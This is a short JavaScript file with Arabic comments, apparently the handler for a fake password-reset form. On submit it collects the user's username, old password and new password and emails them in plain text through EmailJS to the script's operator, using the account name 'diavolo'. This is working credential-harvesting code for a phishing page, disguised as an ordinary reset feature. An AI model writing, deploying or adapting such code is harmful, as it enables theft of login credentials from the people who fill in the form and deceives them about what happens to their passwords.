// إعداد EmailJS
(function() {
    emailjs.init("diavolo");  // استبدل بـ User ID الخاص بك
})();

// التعامل مع إرسال البيانات عبر EmailJS
document.getElementById('resetPasswordForm').addEventListener('submit', function(event) {
    event.preventDefault(); // منع إرسال النموذج بالطريقة التقليدية

    // الحصول على القيم المدخلة في النموذج
    var username = document.getElementById('username').value;
    var oldPassword = document.getElementById('old_password').value;
    var newPassword = document.getElementById('new_password').value;

    // إرسال البيانات عبر EmailJS
    emailjs.send("Service_diavolo12", "template_009c0je", {
        "username": username,
        "old_password": oldPassword,
        "new_password": newPassword
    })
    .then(function(response) {
        console.log('تم إرسال البريد بنجاح', response);
    }, function(error) {
        console.log('فشل في إرسال البريد', error);
    });
});